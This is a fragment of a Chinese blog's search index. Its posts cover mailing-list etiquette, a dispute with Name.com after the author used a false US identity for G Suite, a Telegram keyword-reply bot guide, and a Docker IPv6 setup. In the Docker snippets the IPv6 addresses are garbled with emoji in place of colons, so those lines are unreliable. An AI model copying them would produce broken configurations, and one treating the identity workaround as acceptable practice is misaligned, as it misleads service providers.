","date":"2019-11-27","objectID":"https://lgf.im/posts/learn/maillist/:1:2","tags":["maillist","mail"],"title":"了解邮件列表","uri":"https://lgf.im/posts/learn/maillist/"},{"categories":["learn"],"content":"哪里用到邮件列表 其实很多地方会用到邮件列表，特别是在计算机领域，很多大佬喜欢用。他们认为网页论坛内容杂乱，无法进行深入、高效的交流，内容往往缺乏思考和谨慎。邮件就恰恰相反，发邮件时我们往往会进行慎重思考，深思熟虑之后写一长篇文章，这样最有利于交流 QQ邮箱中会看到群邮件功能，这其实就是一个讨论型的邮件列表功能。但这一功能实际上只有极少一部分人充分利用了起来，绝大多数群并没有有效的利用。这个功能现大多沦为广告和病毒木马多发地，真是令人惋惜 Debian、维基百科等大型组织大都自己搭建邮件列表服务，而大部分中小组织都时直接使用Google Group提供的服务，Google Group应该拥有最多的邮件列表 现在Github仓库的Issue功能也与邮件列表差不多了，watching该仓库的人可以收到对应的邮件，也可以通过邮件进行回复 ","date":"2019-11-27","objectID":"https://lgf.im/posts/learn/maillist/:2:0","tags":["maillist","mail"],"title":"了解邮件列表","uri":"https://lgf.im/posts/learn/maillist/"},{"categories":["learn"],"content":"如何使用邮件列表 接下来我们实践如何加入一个邮件列表、在邮件列表中发起讨论、参与邮件列表中已经发起的讨论、退出邮件列表等常用操作 ","date":"2019-11-27","objectID":"https://lgf.im/posts/learn/maillist/:3:0","tags":["maillist","mail"],"title":"了解邮件列表","uri":"https://lgf.im/posts/learn/maillist/"},{"categories":["learn"],"content":"加入邮件列表 加入一个邮件列表有两种方法: 通过在网页填写自己的邮箱地址加入 比较正统的方法，通过发送邮件加入 我们以 sdusec@googlegroups.com 这个邮件列表为例，演示如何加入它 邮件列表有一个主邮箱地址，同时有一些辅助邮箱地址，通过发送邮件加入邮件列表需要使用 sdusec+subscribe@googlegroups.com 这个辅助邮箱地址 在Google Group中订阅一个邮箱列表可以给 邮件列表名+subscribe@googlegroups.com 这个邮箱地址发任意邮件，这里需要注意不能省略加号 在发送邮件后就会收到邮件列表的确认邮件，按照提示回复或点击按钮即可成功加入，对于Google Group我们回复confirm进行确定 然后我们就会收到加入成功的通知，有些列表需要管理员进行审核，等待即可 审核通过后也会收到邮件通知 一些其他类型邮箱列表的加入方式可能稍有不同，其中有一部分需要发送主题为 subscribe 的邮件才能加入，同时订阅的邮箱地址不是**+subscribe**，而是**-subscribe**，这里是减号 这里介绍的是通用方法，可能与某些邮件列表的方法不符，在尝试加入一个邮件列表之前你需要通过说明页面查看具体的订阅方法 ","date":"2019-11-27","objectID":"https://lgf.im/posts/learn/maillist/:3:1","tags":["maillist","mail"],"title":"了解邮件列表","uri":"https://lgf.im/posts/learn/maillist/"},{"categories":["learn"],"content":"发起讨论 在邮件列表中发起讨论也是通过发送邮件来实现的，将讨论的内容发送给公共的邮箱地址，例如发送给sdusec@googlegroups.com，邮件列表服务器就会将你的邮件发送给订阅该列表的每一个人 注意，不要往主邮箱地址发送垃圾内容，否则会引起大家的反感。同时，在发起讨论前你要精心编辑问题内容和标题，发布高质量的讨论而不是垃圾 ","date":"2019-11-27","objectID":"https://lgf.im/posts/learn/maillist/:3:2","tags":["maillist","mail"],"title":"了解邮件列表","uri":"https://lgf.im/posts/learn/maillist/"},{"categories":["learn"],"content":"参与讨论 如果你收到一封邮件，想要参与讨论，只需要回复这封邮件 一般情况下我们使用的邮件服务会自动将标题重命名为 Re: 原标题或者回复：原标题的格式，同时正文内容中会引用被回复的邮件内容。如果你是用的邮箱系统不支持这个操作，建议切换至Gmail 注意，点击发送前观察你回复的是不是公共邮箱，只有这样其他人所有人才能看到你回复的内容 如果回复内容只想让部分人可见，需要手动指定回复的邮箱地址 ","date":"2019-11-27","objectID":"https://lgf.im/posts/learn/maillist/:3:3","tags":["maillist","mail"],"title":"了解邮件列表","uri":"https://lgf.im/posts/learn/maillist/"},{"categories":["learn"],"content":"退订邮件列表 与加入方式类似，需要将subscribe换成unsubscribe ","date":"2019-11-27","objectID":"https://lgf.im/posts/learn/maillist/:3:4","tags":["maillist","mail"],"title":"了解邮件列表","uri":"https://lgf.im/posts/learn/maillist/"},{"categories":["learn"],"content":"如何用好邮件列表 使用邮件列表非常简单，但是想要用好还是得花点功夫。无论是邮件的标题还是内容，都需要精心准备，否则会被列表中的其他人视作垃圾或问题被忽视 ","date":"2019-11-27","objectID":"https://lgf.im/posts/learn/maillist/:4:0","tags":["maillist","mail"],"title":"了解邮件列表","uri":"https://lgf.im/posts/learn/maillist/"},{"categories":["learn"],"content":"Email格式 设置好签名档 公务邮箱应该包括姓名, 公司名称, 地址, 传真, 联系方式等 私人邮箱包括姓名(如经常与国外往来,应使用拼音或英文名), 邮箱地址, blog等必要信息 清晰简明的标题，30字以内, 尽可能的包含5W1H 可以添加标签, 方便收件人客户端自动分类.如, 通知, 汇报等 抬头, 落款 ","date":"2019-11-27","objectID":"https://lgf.im/posts/learn/maillist/:4:1","tags":["maillist","mail"],"title":"了解邮件列表","uri":"https://lgf.im/posts/learn/maillist/"},{"categories":["learn"],"content":"内容表述 倒金字塔叙事 开头讲清楚概括大意, 讲清楚5W1H 慢慢展开，旁征博引 5W1H who 谁 When 何时 Where 何地, 或什么过程中 What 遇到了什么问题 Why 为何会出现这个问题 How 如何,或进行过怎样的尝试, 以及其他方便他人理解问题的信息 ","date":"2019-11-27","objectID":"https://lgf.im/posts/learn/maillist/:4:2","tags":["maillist","mail"],"title":"了解邮件列表","uri":"https://lgf.im/posts/learn/maillist/"},{"categories":["learn"],"content":"提问的智慧 提问之前 Google it 询问精通此道的身边人 三思而后问 怎样提问 语法正确, 拼写无误 精确描述, 信息量大 只说症状, 不说猜想 问题解决后要有简短声明 具体参见http://wiki.woodpecker.org.cn/moin/AskForHelp… 附件文档请输出为pdf版 ","date":"2019-11-27","objectID":"https://lgf.im/posts/learn/maillist/:4:3","tags":["maillist","mail"],"title":"了解邮件列表","uri":"https://lgf.im/posts/learn/maillist/"},{"categories":["learn"],"content":"避免邮件出现乱码 注意编码格式，使用utf-8编码, 不要使用GBK之类的编码 避免中文标点 使用常见的emoji，避免使用生僻的图标 ","date":"2019-11-27","objectID":"https://lgf.im/posts/learn/maillist/:4:4","tags":["maillist","mail"],"title":"了解邮件列表","uri":"https://lgf.im/posts/learn/maillist/"},{"categories":["learn"],"content":"防止线索断开 在使用邮件列表的过程中，会遇到线索断开的情况 当看到有人提到线索断了的时候，就需要检查自己回复的邮件，标题是否有 RE原邮件 ，内容中是否有引用被回复的邮件 正常情况下你使用的邮件软件会自动完成这些内容，如果没有那你得考虑更换邮件软件或者服务 ","date":"2019-11-27","objectID":"https://lgf.im/posts/learn/maillist/:4:5","tags":["maillist","mail"],"title":"了解邮件列表","uri":"https://lgf.im/posts/learn/maillist/"},{"categories":["learn"],"content":"一些邮件列表 https://lists.wikimedia.org/mailman/listinfo ","date":"2019-11-27","objectID":"https://lgf.im/posts/learn/maillist/:5:0","tags":["maillist","mail"],"title":"了解邮件列表","uri":"https://lgf.im/posts/learn/maillist/"},{"categories":["life"],"content":"这个事情发生在一个周以内，体验极其糟糕，特此记录一下。 ","date":"2019-11-27","objectID":"https://lgf.im/posts/life/bad-experience-with-name/:0:0","tags":["name","domain","bad"],"title":"使用Name的一次糟糕的体验","uri":"https://lgf.im/posts/life/bad-experience-with-name/"},{"categories":["life"],"content":"事情起因 大半夜突发奇想想要买一个im的域名，通过域名比价网站Namebeta进行搜索，发现里面只有一个是我之前听说过的，Name.com在V2EX上经常看到有人提及和推荐，也就没有考虑价格最低的dynadot，直接注册了Name.com账号。 登录Name网站后购买了lgf.im这个域名，续了5年，一次只能续期一年，分4次续上的。 想要使用这个域名做一个域名邮箱，不想自己搭建，就直接搜索免费的企业邮。 之前有使用过腾讯企业邮、网易企业邮、阿里云企业邮箱，用的都是免费版，体验最好的是腾讯企业邮，还支持域名下所有邮件转发到指定邮箱，如此就可以一个邮箱账号掌管全局了。 注册并登录上之后才发现，腾讯企业邮新版中这个功能竟然变成了收费功能，难受，收费价格还这么贵。 便上网搜索好用的企业邮，再比较各类企业邮之后，就想直接上付费的G Suite，又恰巧Name.com又半价的G Suite可以购买，便想直接在Name购买。 支付宝付款，很快便支付成功，然后进入G Suite商品设置界面，需要捆绑上G Suite需要使用的域名，这里选择了刚刚购买的域名，但是提示profile不能绑定该域名。具体提示词我也忘记了，当时没有截图。 既然不能用，那我就申请退款吧，就发了一个申请退款G Suite的工单，工单在当天半夜1点回复了我。工单中说明G Suite不支持中国，并且可以退款，当天晚不到2点钱就退回了支付宝，退款速度很快。 第二天我就想，既然中国区的账号信息无法使用G Suite，那我改成美国的身份应该就可以了吧，所以找出我之前使用过的一个美国身份，修改账号信息。 然后重新购买了G Suite，这一次成功绑定，当天上午就将各种配置修改好，成功使用G Suite了。 本以为本次的购物就这么愉快的结束了，域名续了5年，G Suite也点了自动信用卡续费，可谁知坏消息当天中午就发生了。 ","date":"2019-11-27","objectID":"https://lgf.im/posts/life/bad-experience-with-name/:1:0","tags":["name","domain","bad"],"title":"使用Name的一次糟糕的体验","uri":"https://lgf.im/posts/life/bad-experience-with-name/"},{"categories":["life"],"content":"域名被删强制退款 中午，接连收到了信用卡的短信通知和支付宝的通知推送，之前购买和续费域名的钱被退回来了。我就感觉莫名其妙，赶紧登陆账号查看发生了什么。 刚购买的域名被删了，连个邮件通知都没有，直接删域名退款。。。 我以为是昨天的申请G Suite退款的工单，工作人员搞错了，错误的把域名也给我退款了，赶紧发了一个工单进行询问。 等了好久也没有回复，想着晚上在看看吧。 ","date":"2019-11-27","objectID":"https://lgf.im/posts/life/bad-experience-with-name/:2:0","tags":["name","domain","bad"],"title":"使用Name的一次糟糕的体验","uri":"https://lgf.im/posts/life/bad-experience-with-name/"},{"categories":["life"],"content":"账号被封 晚上回宿舍想要看一下工单进度，就发现登录不上name账号了。 点击立即重置密码发现并没有收到重置邮件，上网搜索相关信息后怀疑账号被封了。 第二天上午，我收到了工单的回复，提示我需要再次验证账号身份。 WTF?? 因为提了工单，所以就要锁我账号？就要更多我的个人隐私？？什么鬼！！ 没办法，G Suite还没到期，后面可能还要用到name.com，所以就按照他的要求上传了各种信息。 第二天晚上，收到了最终回复，账号不予解封，白嫖我个人信息，气死了。 ","date":"2019-11-27","objectID":"https://lgf.im/posts/life/bad-experience-with-name/:3:0","tags":["name","domain","bad"],"title":"使用Name的一次糟糕的体验","uri":"https://lgf.im/posts/life/bad-experience-with-name/"},{"categories":["life"],"content":"后续 因为是正式开始使用dynadot了，就需要好好了解一下这个域名购买网站。 上网对其进行了搜索，后悔一开始没有选择dynadot，看各种评价，发现口碑很好，主要还很便宜。 据我自己的使用体验，只要国家设置成中国，语言中文，币种选择人民币，dynadot是支持支付宝和微信支付的，非常方便。 ","date":"2019-11-27","objectID":"https://lgf.im/posts/life/bad-experience-with-name/:4:0","tags":["name","domain","bad"],"title":"使用Name的一次糟糕的体验","uri":"https://lgf.im/posts/life/bad-experience-with-name/"},{"categories":["life"],"content":"后记 dynadot一开始买的时候最多选3年，我想要一次性续5年，可是选择续费后返回一个错误，难不成最多只能续3年？？ 先不管了，反正开了自动续费，还有3年，等到期了再说。 ","date":"2019-11-27","objectID":"https://lgf.im/posts/life/bad-experience-with-name/:5:0","tags":["name","domain","bad"],"title":"使用Name的一次糟糕的体验","uri":"https://lgf.im/posts/life/bad-experience-with-name/"},{"categories":["life"],"content":"总结 在Name的这次体验让我感到极为不友好，体验炒鸡糟糕，烦！ 但是反省自己，也不是没有错，审查归根到底还是因为我使用了虚假的美国身份。 现在越来越多的国外厂商针对中国人的审查变得越来越严，我认为这极大一部分原因是国内羊毛党太多，他们真的被薅怕了，迫不得已加强审查。 后来我才听同学说，近期Name有活动，可以撸域名，沃日，难不成审查他们的虚假账号我倒霉的中枪了? ","date":"2019-11-27","objectID":"https://lgf.im/posts/life/bad-experience-with-name/:6:0","tags":["name","domain","bad"],"title":"使用Name的一次糟糕的体验","uri":"https://lgf.im/posts/life/bad-experience-with-name/"},{"categories":["coding"],"content":"前言 高中时期了解了telegram，大学期间正式开始使用。自己的频道最多的时候有上万人关注，聊天群组里人数也很多，但是时间久了我发现了一个问题。因为telegram在国内并不常用，新加入的成员往往都是新手，通常会问一些琐碎的、相似的问题，例如：如何汉化tg、+86号码无法私聊别人，等等相关的问题是在不想重复回答，便产生了制作一个关键词回复机器人的想法。 ","date":"2019-11-26","objectID":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/:1:0","tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/"},{"categories":["coding"],"content":"功能 下面简单说一下机器人实现的一些功能，具体还是推荐你亲身进行体验。 首先为了满足最初的需求，机器人需要能够对特定关键词回复特定的文字内容。 为了能够更加灵活的匹配关键词，针对关键词识别增加了正则匹配方式的关键词识别方法，可以让用户能够编写更加灵活的关键词规则。 为了满足更加更多种类的回复内容，回复种类除了文字还增加了照片、动图、视频、文件、表情、Marddown等其他的回复种类，并且允许给图片、文件等添加描述信息。 为了满足部分群组的多样化回复需求，回复方式增加了 多个回复消息混合、多个回复类型混合、回复内容随机选择 等复杂但灵活的规则配置方式。 为了能够实现部分群管功能，回复类型增加了群管操作，包括 消息删除、消息置顶、人员禁言、人员踢出等功能，只需要设置相应的关键词回复规则即可。 除了关键词功能外，我还给机器人增加了群管命令、获取用户id信息、禁言游戏、加群欢迎、退群送别、一键呼叫所有管理员等功能。 下面我将演示一些基本的功能配置和使用方法。 ","date":"2019-11-26","objectID":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/:2:0","tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/"},{"categories":["coding"],"content":"使用示例 关键词规则的使用 添加规则使用 /add 关键词===回复内容 删除规则使用 /del 关键词 查看规则在群组里使用 /list ","date":"2019-11-26","objectID":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/:3:0","tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/"},{"categories":["coding"],"content":"回复文本内容 /add 汉化===tg支持语言包功能，点击【链接】即可修改为中文。 添加这条规则之后，机器人就会对每一条包含有“汉化”关键词的消息回复“tg支持语言包功能，点击【链接】即可修改为中文。”这个特定内容。 回复文字支持markdown语法，添加前缀 md:: 即可使用 /add testmd===md::加粗**bold** ","date":"2019-11-26","objectID":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/:3:1","tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/"},{"categories":["coding"],"content":"回复图片 /add 关键词===photo::图片链接 图片链接需要时互联网上tg服务器可以访问到的图片，可以是tg上公开群组或者频道的图片消息链接或者互联网上任意图片资源链接 例如： /add 小白兔===photo::https://img.cdn.com/tupian.jpg /add 小可爱===photo::https://t.me/peekfun/1000 ","date":"2019-11-26","objectID":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/:3:2","tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/"},{"categories":["coding"],"content":"回复动图\\视频\\文件 机器人除了回复图片外，还支持回复动图、视频、文件，如果你已经学会了回复图片，那这些种类也没有问题。 动图 /add 关键词===gif::动图链接 视频 /add 关键词===video::视频链接 文件 /add 关键词===file::文件链接 需要注意的是，各种链接要么是tg上公开群组或者频道的链接（私有群组不行），要么是互联网上的资源链接，注意链接需要与发送的种类对应好。 ","date":"2019-11-26","objectID":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/:3:3","tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/"},{"categories":["coding"],"content":"图片\\文件添加文字 在手动发送图片等的时候我们可以添加描述信息，机器人回复规则也可以。 为了便于理解，添加了缩进和换行，添加规则的时候不要缩进和换行 /add 关键词===photo::图片链接::描述文字 /add 小白兔=== photo::https://img.cdn.com/tupian.jpg :: 这里是描述文字，例如原来你也喜欢小白兔呀 文件的使用也是类似，就不再重复 注意：图片和文件的介绍文字默认开启markdown语法 ","date":"2019-11-26","objectID":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/:3:4","tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/"},{"categories":["coding"],"content":"正则表达式进行匹配 现在你已经会使用关键词来回复特定内容了，但是为了更加灵活的回复，而不是令机器人看起来傻乎乎的 事实上机器人聪明与否完全看你设置的关键词规则是否灵活，你需要学习简单的正则表达式并且利用正则来进行匹配。 使用正则匹配非常简单，只需要将原来的关键词替换为 re:正则规则 即可。 /add re:(如何|怎样).*(激活|使用)===请查看这个说明 在这个例子里面，使用了正则表达式进行了匹配，此时用户发送 “有谁知道怎样进行账号的激活吗？”也可以匹配上，这大大提高了规则的灵活性。 需要说明的是，机器人的所有关键词使用方法均支持正则，你可以随意进行尝试。 ","date":"2019-11-26","objectID":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/:3:5","tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/"},{"categories":["coding"],"content":"一次回复多条消息 有些时候一条消息无法满足回复的需求，需要机器人同时返回多个消息，这也是支持的。 你只需要用 || 将多个回复内容间隔开就可以了。 /add 关键词===回复文字1||回复文字2||回复文字3 不同种类的回复内容也可以混合在一起，请随意混搭 为了便于理解，添加了缩进和换行，添加规则的时候不要缩进和换行 /add 关键词=== 请欣赏 || photo::图片链接 || video::视频链接 || 如果需要更多内容，你可以下载软件 || file::文件链接 ","date":"2019-11-26","objectID":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/:3:6","tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/"},{"categories":["coding"],"content":"回复随机消息 有一个群组提出了这样一个特定需求，想要从设置好的回复内容中随机回复一个，这也是支持的。 使用方法： random{回复内容1$$回复内容2$$回复内容3}，使用两个英文的$符号间隔。 为了便于理解，添加了缩进和换行，添加规则的时候不要缩进和换行 /add 关键词=== random::{ 一条消息 $$ photo::PHOTO_URL $$ 另一条消息 } 在这个关键词规则里，机器人将自动从三条消息中选择一个发出。 你可以结合上面一个使用方法，让规则更加灵活 为了便于理解，添加了缩进和换行，添加规则的时候不要缩进和换行 /add 小白兔=== 你也喜欢小白兔呀，送你一张小白兔的照片 || random::{ photo::照片链接1 $$ photo::照片链接2 $$ photo::照片链接3 } || 如果喜欢可以下载软件获取更多图片 || file::文件的链接 ","date":"2019-11-26","objectID":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/:3:7","tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/"},{"categories":["coding"],"content":"自动删除消息 大多数时候我们需要屏蔽一些关键词，防止用户讨论相关内容，比如说政治、色情、黑产等内容。 机器人既然可以识别关键词，就可以进行相关消息删除操作，你需要给机器人删除消息的管理员权限。 /add 日站===delete 这样机器人就会将含有 日站 二字的消息自动删除，起到屏蔽的作用，你可以使用正则进行更加灵活的匹配。 直接删除可能不太友好，你可以结合前面的内容进行优化，比如结合多个回复内容进行添加提示语。 /add 日站===本群禁止讨论黑产相关内容||delete 这样的规则机器人就会先回复“本群禁止讨论黑产相关内容”，然后再进行删除。 注意：delete一定要放在最后，否则回复消息发送不出来。 ","date":"2019-11-26","objectID":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/:3:8","tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/"},{"categories":["coding"],"content":"自动禁言\\踢人 只删除还不过瘾，有人刷消息？禁言和踢人同样支持。 禁言 /add keyword===ban 会自动禁言发送keyword的用户 永久 禁言特定时长 /add keyword===ban::3d6h20m36s 会自动禁言发送keyword的用户 3天6个小时20分钟36s 时长信息4个时间单位不必全部写满，时长换算成秒如果低于30s意味着永久禁言，多于1年也是永久禁言 踢人 /add 日站===kick 你还是可以结合上面的内容进行优化，因为delete、ban、kick也是回复种类之一，所以跟文字、照片、视频、文件等的使用方法相同，也就可以进行组合。 ","date":"2019-11-26","objectID":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/:3:9","tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/"},{"categories":["coding"],"content":"屏蔽特定后缀文件 有人发送exe\\com\\bat等后缀的病毒？不用再去找其他机器人了，使用自定义规则即可完成屏蔽和禁言。 /add re:(\\.exe|\\.scr|\\.cpl|\\.com|\\.cmd|\\.bat|\\.vbs)$===ban 这样带有exe\\src\\cpl\\com\\cmd\\bat\\vbs等可执行后缀的文件就会被自动删除，相关发送者就会被禁言。 关键词功能可以根据每个群组添加的不同的关键词规则实现一些简单的回复或者更加复杂的操作，通过组合等方式来实现相应功能完全看你的规则，所以发挥你的脑洞吧。 ","date":"2019-11-26","objectID":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/:3:10","tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/"},{"categories":["coding"],"content":"进群欢迎和退群欢送 机器人可以设置欢迎和欢送文字 需要使用 /welcome 和 /goodbye 命令分别开启 /welcome 开启后，可以设置内容 /setwelcometext 欢迎 $username 加入 $groupname 这个大家庭 /goodbye 开启后，可以设置内容 /setgoodbyetext $username离开了我们群 注意：加群欢迎和退群欢送文字默认开启markdown语法 使用 $userid 自动替换 用户id, $username 自动替换用户名 使用 $groupid 自动替换 群组id， $groupname 自动替换群组名 ","date":"2019-11-26","objectID":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/:3:11","tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/"},{"categories":["coding"],"content":"回复按钮 看样子很多人需要这个功能，就加上了 示例： /add test===button::{\"text\": \"测试按钮消息，支持_Markdown_\",\"buttons\": [[{\"text\":\"百度\",\"url\":\"https://baidu.com\"},{\"text\":\"谷歌\",\"url\":\"https://google.com\"},{\"text\":\"拾取\",\"url\":\"http://t.me/peekfun\"}],[{\"text\":\"百度\",\"url\":\"https://baidu.com\"},{\"text\":\"谷歌\",\"url\":\"https://google.com\"}]]} button::后面的json格式如下 { \"text\": \"测试按钮消息，支持_Markdown_\", // 这里是回复的消息内容，支持markdown，群组名替换啥的 \"buttons\": [ // 按钮列表 // 第一行按钮 [ {\"text\":\"百度\",\"url\":\"https://baidu.com\"}, {\"text\":\"谷歌\",\"url\":\"https://google.com\"}, {\"text\":\"拾取\",\"url\":\"http://t.me/peekfun\"} ], // 第二行按钮 [ {\"text\":\"百度\",\"url\":\"https://baidu.com\"}, {\"text\":\"谷歌\",\"url\":\"https://google.com\"} ] ] } ","date":"2019-11-26","objectID":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/:3:12","tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/"},{"categories":["coding"],"content":"命令列表 help - 查看帮助 add - 添加规则 del - 删除规则 list - 列出规则 admin - 呼叫管理员 banme - 禁言小游戏 getid - 查看用户的信息 可回复查看别人 autoreply - 开关自动回复功能 autodelete - 开关自动删除消息功能 replyorder - 开关回复ban/kick命令功能 banmegame - 开关禁言小游戏功能 playorderban - 开关玩命令惩罚功能 banqingzhen - 开关防清真功能 calladmin - 开关呼叫管理员功能 welcome - 开关加群欢迎功能 goodbye - 开关离群送别功能 deletejoinmessage - 开关删除加群消息功能 servicelist - 查看机器人功能列表 deleteallrules - 清空本群所有关键词规则 deleteallmessage - 删除48小时内所有消息 ","date":"2019-11-26","objectID":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/:4:0","tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/"},{"categories":["coding"],"content":"开源 开源地址： https://github.com/zu1k/tg-keyword-reply-bot ","date":"2019-11-26","objectID":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/:5:0","tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/"},{"categories":["coding"],"content":"赞助 这里要特别感谢 聪聪，是他赞助了服务器费用。 聪聪大佬是tg上 印象笔记群组 的创建者，他的群组和频道是tg上中文交流（不讨论政治、色情、黑产）的一个不错的地方，推荐刚刚开始使用tg的同学加入。 聪聪的群组 @yxbjx 聪聪的频道 @YinxiangBiji_News 如果你认为这个机器人为你管理群组提供了帮助，那么期待你的赞助，你的赞助可以帮助机器人运行更长时间，同时你的名字也会被记录到机器人开源页。 ","date":"2019-11-26","objectID":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/:6:0","tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/"},{"categories":["coding"],"content":"如何赞助 一共有两种方式可以给这个机器人提供赞助 通过邮箱联系我，然后索要我的赞赏码或者其他收款方式 ","date":"2019-11-26","objectID":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/:6:1","tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/"},{"categories":["coding"],"content":"问题反馈 目前有效的反馈方式是github上的 Issue页面 ，目前仅支持闭源版本问题反馈，反馈时请一次性描述清楚，必要时请附加截图，这样有利于更好的解决问题。 如果是增加特定功能就不要反馈了，如有需求可以找我或别人定制特定的机器人。 ","date":"2019-11-26","objectID":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/:7:0","tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/"},{"categories":["coding"],"content":"后续工作 其实我已经退出tg大半年了，已经不太需要机器人了，目前全靠聪聪支持支撑 不过机器人后续开发不会停止，今年比较忙，等我闲下来给机器人做一个大版本更新 后续会将 匹配 和 动作 进行拆分，匹配将支持更加细致和灵活的方式，动作会进行增加，争取支持tg所有的消息类型和群组管理类型 还会增加网页控制后台，可以在网页后台查看群组统计信息，并对群组机器人规则进行设置 ","date":"2019-11-26","objectID":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/:8:0","tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://lgf.im/posts/coding/telegram-keyword-reply-bot/"},{"categories":["docker"],"content":"ipv6不断普及，ipv6地址多的数不胜数，机房给单台机器分配的ipv6段达到了可怕的64位长度的子网主机号。 那我不禁在想，能不能给docker下的每个容器独立的ipv6地址，这样就不需要映射端口号了。 所以就有了以下实践： 首先，给docker engine开启ipv6支持, 参考： https://docs.docker.com/config/daemon/ipv6/ 配置/etc/docker/daemon.json文件如下。 { \"ipv6\": true, \"fixed-cidr-v6\": \"2001🔢5001🔢:/64\" } 执行 systemctl reload docker 重载Docker Engine的配置文件 这样docker默认的bridge网络就会给容器分配随机的ipv6地址了。 但是我们通常需要固定的ipv6地址，所以需要添加自定义网桥网络 docker network create \\ -d bridge --ipv6 \\ --subnet \"2001🔢5001🔢6666::/80\" \\ --gateway=\"2001🔢5001🔢6666::1\" \\ --subnet=172.28.0.0/16 \\ --gateway=172.28.0.1 ipv6 然后启动docker容器时候指定ipv6网桥和ipv6地址 docker run -itd -P --ip=172.28.0.101 \\ --ip6=\"2001🔢5001🔢6666::101\" \\ --network=ipv6 \\ --name=ipv6test \\ ubuntu:18.04 /bin/bash 此时容器已经有独立的ipv6地址了，我们发现向外访问可以访问，但是外界访问不到docker后面隐藏的container 这是因为ipv6使用NDP协议，我们需要在容器的宿主机上设置 ndp代理 sysctl net.ipv6.conf.ens3.proxy_ndp=1 ens3是我的宿主机外网网卡，这里需要替换成你自己的 这里每一个docker分配的ipv6地址都需要添加这样一条规则 ip -6 neigh add proxy 2001🔢5001🔢6666::101 dev ens3 ","date":"2019-08-31","objectID":"https://lgf.im/posts/coding/set-ipv6-for-every-docker-container/:0:0","tags":["docker","ipv6"],"title":"给docker里的每一个容器一个独立的ipv6地址","uri":"https://lgf.im/posts/coding/set-ipv6-for-every-docker-container/"},{"categories":null,"content":" 木兰花令——人生若只如初见 纳兰性德 人生若只如初见，何事秋风悲画扇。 等闲变却故人心，却道故人心易变。 骊山语罢清宵半，泪雨零铃终不怨。 何如薄幸锦衣郎，比翼连枝当日愿。 网上看到一篇散文，很喜欢，就摘了过来。 人生若只如初见，所有往事都化为江南的一场烟雨，在相视一笑中，随风荡漾起回忆的波纹，然后再渐渐隐去在画中的江南，只因为你的离去，我竟为你留下的惊艳，倾情伤怀。 时光太匆匆，我们总也回不到过去，也许曾一见倾心，但再见之时，也许，是伤心之时。若是如此，在那分离的一刻，我怎么也不会让你离去，怎么也不会让定格在唯美初遇的时光流逝，我只期望那一刻可以定格一万年。 初见惊艳，再见依然，这只是一个美好的愿望，蓦然回首，曾经沧海桑田，早已换了人间，再也寻不到灯火阑珊处那一抹清纯的微笑。 人生若只如初见，何事秋风悲画屏？等闲变却故人心，却道故人心易变，骊山语罢消宵半，夜雨零铃终不怨，何如薄幸锦儿衣，比翼连理当日愿。纳兰长于情，深于情，直抒无奈忧郁情，我的伤心又怎不是因情而起？ 